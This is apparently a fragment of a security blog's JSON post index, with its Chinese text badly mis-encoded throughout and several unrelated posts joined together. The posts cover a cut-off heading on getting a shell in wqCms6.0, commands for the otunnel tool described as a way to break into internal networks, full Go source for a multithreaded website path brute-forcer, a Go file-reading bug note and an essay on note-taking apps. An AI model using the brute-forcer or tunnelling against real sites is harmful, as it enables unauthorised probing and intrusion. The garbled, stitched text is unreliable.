id=\"ä¸€æ¼æ´åˆ©ç”¨ç‚¹\"\u003eä¸€ã€æ¼æ´åˆ©ç”¨ç‚¹\u003c/h1\u003e\n\u003cp\u003eæ¼æ´æ–‡ä»¶:admin_UploadDataHandler.ashx è‡ªå®šä¹‰æ„é€ ä¸Šä¼ ç‚¹\u003c/p\u003e","title":"wqCms6.0åœ¨IIS6çš„Getshell"},{"content":"è¿™æ˜¯ä¸€ä¸ªé‡‡ç”¨Golangç¼–å†™çš„å’Œlcxå·®ä¸å¤šçš„ç«¯å£è½¬å‘çš„å·¥å…·ï¼Œç”¨æ¥çªç ´å†…ç½‘ç¯å¢ƒ\né¡¹ç›®åœ°å€ ooclab/otunnel\nä¸‹è½½åœ°å€(å†…æ¶µå„å¤§å¹³å°) http://dl.ooclab.com/otunnel/\notunnel ç”¨æ³• å‰æï¼š\nå‡è®¾ server çš„åœ°å€ä¸º example.com ä» client èƒ½è¿æ¥ server (client ä¸ server æ— éœ€åœ¨åŒä¸€ä¸ªç½‘ç»œ) æ³¨æ„ otunnel ç¨‹åºå¯ä»¥ä½œä¸º server å’Œ client ä¸¤ç§è§’è‰²ï¼ˆè¿è¡Œå‚æ•°ä¸åŒï¼‰\nå¿«é€Ÿä¸Šæ‰‹ server 1 ./otunnel listen :10000 -s longlongsecret client åå‘ä»£ç† ä¸¾ä¾‹ï¼šå°† client å¯ä»¥è®¿é—®çš„ 192.168.1.3:22 æ˜ å°„åˆ° server ä¸Šçš„ 10022 ç«¯å£ï¼š\n1 ./otunnel connect example.com:10000 -s longlongsecret -t \u0026#39;r:192.168.1.3:22::10022\u0026#39; ç°åœ¨è®¿é—® example.com:10022 å³ç­‰äºè®¿é—®äº† client å†…ç½‘çš„ 192.168.1.3:22\næ­£å‘ä»£ç† ä¸¾ä¾‹ï¼šå‡è®¾ example.com çš„ 127.0.0.1:3128 æœåŠ¡ï¼ˆä½ æ‡‚å¾—ï¼‰ï¼Œåœ¨ client è¿è¡Œï¼š\n1 ./otunnel connect example.com:10000 -s longlonglongsecret -t \u0026#39;f::20080:127.0.0.1:3128\u0026#39; ç°åœ¨ client çš„ 20080 ç«¯å£ï¼Œ ç­‰äºè®¿é—® example.com ä¸Šçš„ 127.0.0.1:3128\nç¨‹åºç”¨æ³• -t æ ¼å¼ åŒ…å«å¤šä¸ªå­—æ®µä¿¡æ¯ï¼Œä»¥:éš”å¼€(ä¸ºç©ºçš„å­—æ®µä¹Ÿä¸èƒ½çœç•¥:)ã€‚\n1 ä»£ç†ç±»å‹:æœ¬åœ°åœ°å€:æœ¬åœ°ç«¯å£:è¿œç¨‹åœ°å€:è¿œç¨‹ç«¯å£ å­—æ®µ å«ä¹‰ ä»£ç†ç±»å‹ r è¡¨ç¤ºåå‘ä»£ç†; f è¡¨ç¤ºæ­£å‘ä»£ç† æœ¬åœ°åœ°å€ IPæˆ–åŸŸå æœ¬åœ°ç«¯å£ æ•´æ•° è¿œç¨‹åœ°å€ IPæˆ–åŸŸå è¿œç¨‹ç«¯å£ æ•´æ•° æ³¨æ„\næœ¬åœ°åœ°å€æˆ–è¿œç¨‹åœ°å€å¦‚æœä¸ºç©ºï¼Œè¡¨ç¤ºæ‰€æœ‰ç½‘å£ otunnel å‘½ä»¤è¡Œå¯ä»¥åŒ…å«å¤šä¸ª-té€‰é¡¹ï¼ŒåŒæ—¶æŒ‡å®šå¤šæ¡éš§é“è§„åˆ™ ç‰¹ç‚¹åŠä¼˜åŠ¿ otunnel æ˜¯ä¸€æ¬¾å¯¹ç§°çš„å®‰å…¨éš§é“å·¥å…·ã€‚\nå•äºŒè¿›åˆ¶ç¨‹åºï¼šotunnel ä¸ºä¸€ä¸ªç‹¬ç«‹çš„äºŒè¿›åˆ¶ç¨‹åºï¼Œå¯ä»¥ä½œä¸º server å’Œ client ç«¯ã€‚ æ”¯æŒå¤šæ“ä½œç³»ç»Ÿå¹³å°ï¼šæ”¯æŒGNU/Linux, Unix-like, Mac, Windowsï¼Œå…¶ä»–å¦‚ ddwrt ç­‰ arm å¹³å°ã€‚ æ— éœ€é…ç½®æ–‡ä»¶ï¼šå‘½ä»¤è¡Œä½¿ç”¨ å¯¹ç§°è®¾è®¡ï¼šåŒæ—¶æ”¯æŒ æ­£ã€åå‘ä»£ç†ï¼ˆç«¯å£æ˜ å°„ï¼‰ å®‰å…¨åŠ å¯†ï¼šæ”¯æŒ AES å¯¹ç§°åŠ å¯† ","permalink":"https://www.hacktech.cn/post/otunnel%E4%B8%80%E4%B8%AA%E5%92%8Clcx%E5%B7%AE%E4%B8%8D%E5%A4%9A%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7.html","summary":"\u003cp\u003eè¿™æ˜¯ä¸€ä¸ªé‡‡ç”¨Golangç¼–å†™çš„å’Œlcxå·®ä¸å¤šçš„ç«¯å£è½¬å‘çš„å·¥å…·ï¼Œç”¨æ¥çªç ´å†…ç½‘ç¯å¢ƒ\u003c/p\u003e\n\u003ch1 id=\"é¡¹ç›®åœ°å€\"\u003eé¡¹ç›®åœ°å€\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ooclab/otunnel\"\u003eooclab/otunnel\u003c/a\u003e\u003c/p\u003e","title":"otunnelï¼šä¸€ä¸ªå’Œlcxå·®ä¸å¤šçš„ç«¯å£è½¬å‘çš„å·¥å…·"},{"content":"ä»¥å‰ç”¨Pythonå†™è¿‡è¿™ä¸ªå·¥å…·ï¼Œå‰ä¸¤å¤©çœ‹äº†golangçš„åŸºç¡€ï¼Œå°±æƒ³ç€ç”¨è¿™ä¸ªè¯­è¨€æŠŠè¿™ä¸ªå·¥å…·é‡å†™ä¸€é\nå…ˆæ”¾å¼ å›¾ ç”¨æ³•\n1 2 3 4 5 6 Example : Buster.exe -u=https://www.baidu.com -d=asp.txt -t=5 Busteræ˜¯ä½ çš„ç¨‹åºåå­— -uåé¢å¡«ç½‘å€å‚æ•°ï¼Œæ ¼å¼å¦‚ä¸Š -dé€‰å­—å…¸ -tæ˜¯çº¿ç¨‹æ•° å½“ä½ ç¬¬ä¸€æ¬¡è¿è¡Œè¯·ç›´æ¥åœ¨å‘½ä»¤è¡Œè¿è¡Œä½ çš„ç¨‹åºï¼Œä»€ä¹ˆå‚æ•°éƒ½åˆ«åŠ ï¼Œä»–ä¼šæœ‰æç¤ºä¿¡æ¯å‘Šè¯‰ä½ æ€ä¹ˆåšçš„ è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šä»£ç ï¼Œå­—å…¸é‡‡ç”¨çš„ä»¥å‰æœé›†çš„ä¸€ä¸ªçè—çš„å¤§å­—å…¸ï¼Œè·‘èµ·æ¥å¯èƒ½è€—æ—¶æ¯”è¾ƒä¹…ï¼Œæ–‡ä»¶å¤–é“¾ä¼šæ”¾åœ¨åº•ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 package main import ( \u0026#34;bufio\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;sync\u0026#34; ) var urls chan string var no404URL = make(chan string) var wg sync.WaitGroup //ç­‰å¾…goroutineå®Œæˆ func main() { var baseURL string var dicPath string var threadCount int flag.StringVar(\u0026amp;baseURL, \u0026#34;u\u0026#34;, \u0026#34;https://www.baidu.com\u0026#34;, \u0026#34;website which you want to burst\u0026#34;) flag.StringVar(\u0026amp;dicPath, \u0026#34;d\u0026#34;, \u0026#34;asp.txt\u0026#34;, \u0026#34;dic which you want to use\u0026#34;) flag.IntVar(\u0026amp;threadCount, \u0026#34;t\u0026#34;, 5, \u0026#34;number of Thread\u0026#34;) flag.Parse() if len(os.Args) == 1 { fmt.Println(\u0026#34;------------------------------------\u0026#34;) fmt.Println(\u0026#34; Author | Akkuamn\u0026#34;) fmt.Println(\u0026#34;------------------------------------\u0026#34;) fmt.Println(\u0026#34; Update-v1.0 | 2017-02-07\u0026#34;) fmt.Println(\u0026#34;-------------------------------------\u0026#34;) fmt.Printf(\u0026#34;\\nUsage : \\n\\tExample : %s -u=https://www.baidu.com -d=asp.txt -t=5\\n\\n\u0026#34;, os.Args[0]) fmt.Printf(\u0026#34;View more help via %s -h\\n\\n\u0026#34;, os.Args[0]) listDic(\u0026#34;dic\u0026#34;) } else { dicPath = \u0026#34;./dic/\u0026#34; + dicPath start(baseURL, dicPath, threadCount) wg.Wait() //ç­‰å¾…goroutineå®Œæˆ } } func start(baseURL string, dicPath string, threadCount int) { dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, 0) if dicError != nil { fmt.Printf(\u0026#34;\\nOpenFile Error:æ–‡ä»¶æ‰“å¼€å‡ºé”™ï¼Œè¯·æ£€æŸ¥å­—å…¸æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæˆ–æ–‡ä»¶åæ˜¯å¦å‡†ç¡®\\n\u0026#34;) return } defer dicFile.Close() //æŠŠå¤„ç†åçš„éœ€è¦çˆ†ç ´çš„urlå…¨éƒ¨ä¼ åˆ°ä¿¡é“urls ReturnBurstURL(dicFile, baseURL) //å•ç‹¬å¼€goroutineä»ä¿¡é“no404URLå–æ•°æ®å†™å…¥æ–‡ä»¶ go func() { resultTxt, err := os.OpenFile(\u0026#34;result.txt\u0026#34;, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0660) if err != nil { fmt.Println(\u0026#34;OpenFile Error:\u0026#34; + err.Error()) } resultWriter := bufio.NewWriter(resultTxt) defer resultTxt.Close() for { _, err = resultWriter.WriteString(\u0026lt;-no404URL) if err != nil { fmt.Println(\u0026#34;resultWriter Error:\u0026#34; + err.Error()) } resultWriter.Flush() } }() //å¹¶å‘è®¿é—®ç½‘å€å¹¶å°†çŠ¶æ€ç ä¸ä¸º404çš„ç½‘å€åŠ å…¥ä¿¡é“no404URL for i := 0; i \u0026lt; threadCount; i++ { wg.Add(1) go func(i int) { for len(urls) \u0026gt; 0 { url := \u0026lt;-urls status := HTTPStatus(url) fmt.Printf(\u0026#34;[%d]%s-----%s\\n\u0026#34;, i, status, url) if status != \u0026#34;404 Not Found\u0026#34; { no404URL \u0026lt;- status + \u0026#34;-----\u0026#34; + url + \u0026#34;\\n\u0026#34; } } wg.Done() }(i) } } //è¿”å›HTTPè®¿é—®çŠ¶æ€ç  func HTTPStatus(url string) (status string) { client := http.DefaultClient reqest, err := http.NewRequest(\u0026#34;HEAD\u0026#34;, url, nil) if err == nil { reqest.Header.Set(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0\u0026#34;) reqest.Header.Set(\u0026#34;Accept\u0026#34;, \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#34;) response, err1 := client.Do(reqest) if err1 != nil { fmt.Println(\u0026#34;HTTPRequest Error:\u0026#34; + err1.Error()) } defer response.Body.Close() return response.Status } else { fmt.Println(\u0026#34;NewRequest Error:\u0026#34; + err.Error()) return \u0026#34;400 Bad Request\u0026#34; } } //æŠŠå¤„ç†åçš„éœ€è¦çˆ†ç ´çš„urlå…¨éƒ¨ä¼ åˆ°ä¿¡é“urls func ReturnBurstURL(fURL *os.File, baseurl string) { var urlList []string allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() { newurl := baseurl + \u0026#34;/\u0026#34; + allURLTxt.Text() urlList = append(urlList, newurl) } urls = make(chan string, len(urlList)) for _, url := range urlList { urls \u0026lt;- url } fmt.Printf(\u0026#34;\\nè¯»å–å­—å…¸å®Œæˆï¼Œå‡†å¤‡å¼€å§‹ï¼Œè¯·ç­‰å¾…...\\n\u0026#34;) } //ç½—åˆ—å‡ºå¯ç”¨å­—å…¸ func listDic(dicDir string) { dirList, err := ioutil.ReadDir(dicDir) if err != nil { fmt.Println(\u0026#34;ReadDir Error : \u0026#34; + err.Error() + \u0026#34;\\n\u0026#34;) } fmt.Println(\u0026#34;Dic you can select : \u0026#34;) for _, file := range dirList { fmt.Printf(\u0026#34; %s\\n\u0026#34;, file.Name()) } } åªç¼–è¯‘äº†winå¹³å°ä¸‹çš„ï¼Œå¦‚æœæœ‰éœ€è¦å¯ä»¥è‡ªè¡Œç¼–è¯‘\næºç åŠå­—å…¸åŠwinç¨‹åº å¯†ç : g1gd\n","permalink":"https://www.hacktech.cn/post/first-practice-for-golang-multithread-website-burster.html","summary":"\u003cp\u003eä»¥å‰ç”¨Pythonå†™è¿‡è¿™ä¸ªå·¥å…·ï¼Œå‰ä¸¤å¤©çœ‹äº†golangçš„åŸºç¡€ï¼Œå°±æƒ³ç€ç”¨è¿™ä¸ªè¯­è¨€æŠŠè¿™ä¸ªå·¥å…·é‡å†™ä¸€é\u003c/p\u003e\n\u003cp\u003eå…ˆæ”¾å¼ å›¾\u003cimg loading=\"lazy\" src=\"https://ooo.0o0.ooo/2017/03/04/58ba4e8c66d38.gif\" alt=\"æ¼”ç¤º1.gif\"  /\u003e\n\u003c/p\u003e","title":"Golangåˆç»ƒæ‰‹-å¤šçº¿ç¨‹ç½‘ç«™è·¯å¾„çˆ†ç ´"},{"content":"å‰ä¸¤å¤©é›¶é›¶ç¢ç¢çœ‹å®Œäº†golangçš„åŸºç¡€ï¼Œæƒ³ç€æ‰¾ä¸ªå°é¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œå¯æ˜¯å‡ºç°äº†ä¸€ä¸ªååˆ†æ£˜æ‰‹çš„é—®é¢˜ æˆ‘è¦åšçš„ä¸œè¥¿æ˜¯ç½‘ç«™è·¯å¾„çˆ†ç ´ æ‰€ä»¥æˆ‘ä¼šä»æ–‡æœ¬å­—å…¸ä¸­æŠŠä¸€è¡Œè¡Œè·¯å¾„è¯»å–ç„¶åä¸åŸŸåæ‹¼æ¥ï¼Œä½†æ˜¯æˆ‘åœ¨è·‘èµ·ç¨‹åºåå‡ºç°äº†é—®é¢˜\nä¸‹é¢æ˜¯ä¸€ä¸ªå°ç‰‡æ®µ\n1 2 3 400 Bad Request-----http://www.xxx.com/channel.asp 400 Bad Request-----http://www.xxx.com/index.asp 404 Not Found-----http://www.xxx.com/admin.asp ç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰é”™è¯¯ï¼Œä½†æ˜¯è¿è¡Œç»“æœå°±æ¯”è¾ƒæ€ªäº† Bad Request? è¿™å¹¶ä¸æ˜¯æˆ‘è¦è¯´çš„é‡ç‚¹ï¼Œæˆ‘å‘ç°çš„é—®é¢˜æ˜¯ï¼Œé™¤äº†æœ€åä¸€ä¸ªåœ°å€ï¼Œå‰é¢æ‰€æœ‰çš„åœ°å€éƒ½ä¼šæ˜¾ç¤ºä½400 Bad Request ç»è¿‡å‡ è½®æµ‹è¯•ï¼Œæˆ‘è§‰å¾—åº”è¯¥æ˜¯ç½‘å€æ‹¼æ¥ä¸Šå‡ºäº†é—®é¢˜\næˆ‘çš„æ‹¼æ¥å‡½æ•°æ˜¯è¿™æ ·\n1 2 3 4 5 6 7 8 9 10 11 12 func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) { allURLTxt := bufio.NewReader(fURL) for { urlpath, readerError := allURLTxt.ReadString(\u0026#39;\\n\u0026#39;) newurl := baseurl + strings.Replace(urlpath, \u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;, -1) urlList = append(urlList, newurl) if readerError == io.EOF { fmt.Printf(\u0026#34;\\nè¯»å–å­—å…¸å®Œæˆï¼Œå‡†å¤‡å¼€å§‹ï¼Œè¯·ç­‰å¾…...\\n\u0026#34;) return urlList } } } æˆ‘æŠŠå–ä¸€è¡Œçš„æ–¹å¼æ¢æˆbufio.NewScannerå°±æ­£å¸¸äº†\n1 2 3 4 5 6 7 8 9 func ReturnBurstURL(fURL *os.File, baseurl string) (urlList []string) { allURLTxt := bufio.NewScanner(fURL) for allURLTxt.Scan() { newurl := baseurl + allURLTxt.Text() urlList = append(urlList, newurl) } fmt.Printf(\u0026#34;\\nè¯»å–å­—å…¸å®Œæˆï¼Œå‡†å¤‡å¼€å§‹ï¼Œè¯·ç­‰å¾…...\\n\u0026#34;) return urlList } ç½‘ä¸Šè¯»å–æ–‡ä»¶ä¸€è¡Œå¾ˆå¤šäººå†™çš„æ–‡ç« æ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆé—®é¢˜å¯¼è‡´è¿™ç§æƒ…å†µçš„å‘ç”Ÿ æˆ‘ç‰¹åœ°å»æŸ¥äº†æŸ¥apiæ–‡æ¡£\n1 2 3 4 5 6 7 8 9 10 func NewReader(rd io.Reader) *Reader //NewReader returns a new Reader whose buffer has the default size. func (b *Reader) ReadString(delim byte) (string, error) //ReadString reads until the first occurrence of delim in the input, returning a string containing the data up to and including the delimiter. If ReadString encounters an error before finding a delimiter, it returns the data read before the error and the error itself (often io.EOF). ReadString returns err != nil if and only if the returned data does not end in delim. For simple uses, a Scanner may be more convenient. func NewScanner(r io.Reader) *Scanner //NewScanner returns a new Scanner to read from r. The split function defaults to ScanLines. func (s *Scanner) Scan() bool //Scan advances the Scanner to the next token, which will then be available through the Bytes or Text method. It returns false when the scan stops, either by reaching the end of the input or an error. After Scan returns false, the Err method will return any error that occurred during scanning, except that if it was io.EOF, Err will return nil. Scan panics if the split function returns 100 empty tokens without advancing the input. This is a common error mode for scanners. func (s *Scanner) Text() string //Text returns the most recent token generated by a call to Scan as a newly allocated string holding its bytes. æŒ‰ç…§ä¸Šé¢çš„apiæ–‡æ¡£ï¼Œè¿™ä¸¤ä¸ªçš„åŒºåˆ«å°±æ˜¯ä¸¤è€…åœ¨è¿”å›stringçš„æ—¶å€™ï¼Œä¸€ä¸ªæ˜¯æ•°æ®+åˆ†éš”ç¬¦ï¼Œä¸€ä¸ªæ˜¯ä¸€è¡Œçš„æ•°æ®ï¼Œä¸å¸¦åˆ†éš”ç¬¦ è™½è¯´æˆ‘ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿç”¨strings.Replaceæ–¹æ³•æŠŠ\u0026quot;\\n\u0026quot;æ›¿æ¢æˆäº†\u0026quot;\u0026ldquo;ç©ºå­—ç¬¦ï¼Œä½†æ˜¯å¯èƒ½è¿˜æ˜¯æœ‰ç‚¹å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿\nè½¬è½½è¯·æ³¨æ˜å‡ºå¤„\n","permalink":"https://www.hacktech.cn/post/golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html","summary":"\u003cp\u003eå‰ä¸¤å¤©é›¶é›¶ç¢ç¢çœ‹å®Œäº†golangçš„åŸºç¡€ï¼Œæƒ³ç€æ‰¾ä¸ªå°é¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œå¯æ˜¯å‡ºç°äº†ä¸€ä¸ªååˆ†æ£˜æ‰‹çš„é—®é¢˜\næˆ‘è¦åšçš„ä¸œè¥¿æ˜¯ç½‘ç«™è·¯å¾„çˆ†ç ´\næ‰€ä»¥æˆ‘ä¼šä»æ–‡æœ¬å­—å…¸ä¸­æŠŠä¸€è¡Œè¡Œè·¯å¾„è¯»å–ç„¶åä¸åŸŸåæ‹¼æ¥ï¼Œä½†æ˜¯æˆ‘åœ¨è·‘èµ·ç¨‹åºåå‡ºç°äº†é—®é¢˜\u003c/p\u003e","title":"Golangè¸©å‘å½• ä¸¤ç§æ–¹å¼æ¥è¯»å–æ–‡ä»¶ä¸€è¡Œæ‰€å¯¼è‡´çš„é—®é¢˜"},{"content":"æˆ‘æœ‰æ®µæ—¶é—´ç–¯ç‹‚ä½¿ç”¨å„ç±»ç¬”è®°è½¯ä»¶ï¼Œç›¸ä¿¡ä»€ä¹ˆäº‘è®°å¿†ï¼Œç¬¬äºŒå¤§è„‘ä¹‹ç±»çš„è¯´æ³•ã€‚åæ¥å‘ç°ï¼Œæ²¡å•¥æ„ä¹‰ã€‚è®°å¤šäº†æ ¹æœ¬çœ‹ä¸å®Œï¼Œä½ åœ¨å½“æ—¶æ²¡æ—¶é—´çœ‹çš„ï¼Œè¿‡åæ›´æ²¡æ—¶é—´çœ‹ã€‚ç¬”è®°å”¯ä¸€å‰©ä¸‹çš„ä½œç”¨å°±æ˜¯æ£€ç´¢ï¼Œä½†æ˜¯ä½ æ²¡çœ‹è¿‡çš„å†…å®¹ï¼Œä½ åˆæ€ä¹ˆçŸ¥é“è¦æ£€ç´¢å•¥å‘¢ï¼Ÿè€Œä¸”ï¼Œè‡ªå·±ç»´æŠ¤çš„èµ„æ–™åº“ï¼Œæ€ä¹ˆä¹Ÿæ²¡åŠæ³•è·Ÿgoogleçš„æ£€ç´¢æ¯”ã€‚å–„ç”¨googleçš„æœç´¢è§„åˆ™ï¼Œæ¯”æµªè´¹æ—¶é—´å‰ªè—ä¿å­˜ä¸€å¤§å †ç½‘é¡µæœ‰æ•ˆå¾—å¤šã€‚\nå…¶å®æ»¥ç”¨æˆ–è€…è¿‡åˆ†ä¾èµ–è¿™äº›ç¬”è®°è½¯ä»¶ï¼Œæœ€å¤§çš„åå¤„æ˜¯äº§ç”Ÿäº†çŸ¥è¯†å¢é•¿çš„é”™è§‰ã€‚å‰ªè—ä¸€ç¯‡æœºå™¨å­¦ä¹ çš„é•¿æ–‡ï¼Œå°±ä»¥ä¸ºè‡ªå·±çš„çŸ¥è¯†å¢é•¿äº†ï¼Œå…¶å®åªæ‰«äº†ä¸€çœ¼å‰è¨€ã€‚ ä¸‹è½½äº†ä¸€ç³»åˆ—æ–°æ¡†æ¶çš„å¼€å‘æ•™ç¨‹ï¼Œä¸‰åˆ†é’Ÿçƒ­åº¦æŠŠå¼€å‘ç¯å¢ƒæ­å»ºå®Œï¼Œè·Ÿç€ç¬¬ä¸€ç« è·‘äº†ä¸ªhello worldå°±å¼ƒå‘äº†ï¼Œä½†è¿˜æ˜¯åœ¨æ¬ºéª—è‡ªå·±ï¼Œè§‰å¾—è‡ªå·±å·²ç»æŒæ¡äº†ï¼Œæœ€ä¸æµé‚£äº›æ•™ç¨‹å·²ç»è¢«æˆ‘æ”¶åˆ°ç¡¬ç›˜é‡Œäº†ï¼Œè¦ç”¨çš„æ—¶å€™å†ç¿»å‡ºæ¥å­¦å˜›ã€‚è€Œä¸”ï¼Œè¿™ç§å»‰ä»·çš„è·å¾—çŸ¥è¯†çš„é”™è§‰ï¼Œå¸¦æ¥çš„æˆå°±æ„Ÿæ¯”çœŸçš„èŠ±æ—¶é—´å»å­¦ä¹ è¿˜è¦å¼ºï¼Œç”šè‡³ä¼šå½¢æˆâ€œè¦å¼€å·¥äº†-\u0026gt;å…ˆäº†è§£ä¸‹ä¸šç•ŒåŠ¨æ€ï¼Œå»å„å¤§è®ºå›å¾®åšé€›ä¸€åœˆ-\u0026gt;å“‡ï¼Œåˆæœ‰è¿™ä¹ˆå¤šæ–°æ•™ç¨‹/æŠ€å·§/å¼€æºåº“ï¼Œçœ‹ä¸è¿‡æ¥ï¼Œå…ˆä¿å­˜åˆ°ç¬”è®°è½¯ä»¶ -\u0026gt; å•Šï¼Œä¸çŸ¥ä¸è§‰å±…ç„¶èŠ±äº†ä¸€ä¸ªå°æ—¶ï¼Œä¸è¿‡æˆ‘åˆä¸æ˜¯æ‰“æ¸¸æˆçœ‹ç”µå½±ï¼Œæ˜¯åœ¨æ”¶é›†çŸ¥è¯†ï¼Œå¯¹è‡ªå·±è¿˜æ˜¯æœ‰å¸®åŠ©çš„ï¼Œä¸ç®—è™šåº¦æ—¶å…‰å§ -\u0026gt; ç»§ç»­å¼€å·¥ï¼Œå—¯ï¼Ÿè¿™ä¸ªé—®é¢˜å¥½åƒçœ‹åˆ°è¿‡æ›´å¥½çš„è§£å†³åŠæ³•ï¼Œè¦ä¸è¦è¯•ç€ä¼˜åŒ–ä¸‹ï¼Ÿç®—äº†ç®—äº†ï¼Œåæ­£åŠæ³•åœ¨ç¬”è®°é‡Œå­˜ç€ï¼Œä»¥åæœ‰æ—¶é—´å†é‡æ„å§ -\u0026gt;\u0026hellip;\u0026quot;\né‚£å‡ ä¸ªæœˆé‡Œæˆ‘ä¸€ç›´å°±é™·åœ¨è¿™æ ·çš„å¾ªç¯é‡Œï¼ŒåŒæ—¶è¿˜æ²¾æ²¾è‡ªå–œäºè‡ªå·±çš„â€œåŠªåŠ›â€è€Œä¸è‡ªè§‰ã€‚ç›´åˆ°æŸå¤©ï¼Œæœ‰ä¸ªé¢è¯•è€…ååˆ°æˆ‘é¢å‰æ—¶ï¼Œæˆ‘æƒŠè®¶äºä»–é¢è°ˆæ—¶å¯¹å„ç±»ä¸šç•ŒåŠ¨æ€æ–°æ¡†æ¶æ–°æŠ€æœ¯å£è‹¥æ‚¬æ²³ï¼Œä½†æ˜¯å®é™…çš„ç¬”è¯•é¢˜ç›®å´åšå¾—æƒ¨ä¸å¿ç¹ï¼Œæœ‰äº›åŸºç¡€æ¦‚å¿µé¢˜éƒ½ç›´æ¥ç•™ç™½ã€‚æˆ‘è¯•æ¢æ€§åœ°é—®äº†ä¸‹åŸå› ï¼Œç»“æœä»–ç‰¹åˆ«è¯šæ³åœ°çœ‹ç€æˆ‘è¯´ï¼Œè¿™äº›é—®é¢˜çš„ç­”æ¡ˆéƒ½å­˜åœ¨ä»–åŒ…é‡Œçš„ç¬”è®°æœ¬ç”µè„‘é‡Œï¼Œåªè¦ä»–æƒ³ï¼Œåˆ†åˆ†é’Ÿå°±èƒ½æœå‡ºæ¥ã€‚\nå½“æ—¶æˆ‘ä¸‹æ„è¯†åœ°åé—®äº†ä¸€å¥ï¼šâ€œé‚£è°ä¸ä¼šå•Šï¼Ÿâ€\nè¯´å®Œæˆ‘è‡ªå·±éƒ½æƒŠäº†ä¸€ä¸‹ã€‚\né‚£å¤©ä¹‹åï¼Œæˆ‘å¾ˆå°‘å†å»ç¢°é‚£äº›ç¬”è®°è½¯ä»¶äº†ã€‚ç¬¬äºŒå¤§è„‘ä»€ä¹ˆçš„éƒ½æ˜¯éª—äººçš„ï¼Œåœ¨æˆ‘å¾—è€å¹´ç—´å‘†ä¹‹å‰ï¼Œåº”è¯¥ä¸ä¼šç‰¹åˆ«ä¾èµ–å®ƒä»¬ã€‚æ›¾ç»æˆ‘ä¸€ä¸ªæœˆè¦ä»å„å¤§æŠ€æœ¯è®ºå›å¾®åštwitterä¸Šæ”¶é›†å‡ åç¯‡æ•™ç¨‹ï¼Œä¸Šç™¾ç¯‡æŠ€æœ¯é•¿æ–‡ï¼ŒçœŸæ­£çœ‹å®Œçš„ï¼Œä¸åˆ°äº”ç¯‡ã€‚ä¹‹åæˆ‘å‘ç°ï¼ŒæŠŠäº§ç”Ÿè¿™äº›çŸ¥è¯†çš„æºå¤´ææ‰ï¼Œç»Ÿç»ŸåŠ åˆ°127.0.0.1é‡Œå»ï¼ŒèŠ‚çœä¸‹çš„æ—¶é—´è®¤è®¤çœŸçœŸè¯»å‡ æœ¬ç»å…¸çº¸è´¨ä¹¦ï¼Œè·Ÿç€å®˜æ–¹æ–‡æ¡£èµ°ä¸€éæ•™ç¨‹ï¼Œä¸æ”¶é›†ï¼Œå¤šåŠ¨æ‰‹å¤šæ€è€ƒï¼ŒæŠ€æœ¯é•¿è¿›æ¯”ä¹‹å‰å¿«å¾—å¤šã€‚å®é™…åšé¡¹ç›®çš„æ—¶å€™ç¢°åˆ°è§£å†³ä¸äº†çš„é—®é¢˜æ€ä¹ˆåŠï¼Ÿç›´æ¥å¼€googleå»æœå‘—ã€‚æ ¹æœ¬æ²¡å¿…è¦å»æµªè´¹æ—¶é—´ç»´æŠ¤ä¸€ä¸ªç§äººçš„çŸ¥è¯†åº“ã€‚\nåœ¨äººç±»æ•°åƒå¹´æ¼«é•¿çš„æ–‡æ˜å²ä¸­ï¼Œæ”¶è—æœ¬æ¥æ˜¯ä¸€ä»¶ç›¸å½“å¥¢ä¾ˆï¼Œå¤§é‡è€—è´¹é‡‘é’±ã€æ—¶é—´ã€ç²¾åŠ›çš„äº‹æƒ…ã€‚ä½†åˆ°äº†äº’è”ç½‘çš„æ—¶ä»£ï¼Œè¿™ä¸€åˆ‡è¢«ç®€åŒ–æˆäº†ç‚¹ç‚¹é¼ æ ‡å°±èƒ½å®Œæˆçš„ç¾äº‹ã€‚æˆ–è®¸å› ä¸ºç›—ç‰ˆç››è¡Œçš„åŸå› ï¼Œå®ƒå‡ ä¹å·²ç»æ˜¯å…è´¹çš„ï¼Œä½†å®ƒå¯¹äºä¸ªä½“æ—¶é—´ç²¾åŠ›çš„è€—è´¹ï¼Œå´å§‹ç»ˆæ²¡æœ‰å˜åŒ–ã€‚è€Œä¸”ï¼Œèººåœ¨ç¡¬ç›˜é‡Œçš„èµ„æºä»¬ï¼Œå°±åƒç‹é˜³æ˜çš„èŠ±ä¸€æ ·ï¼Œä½ 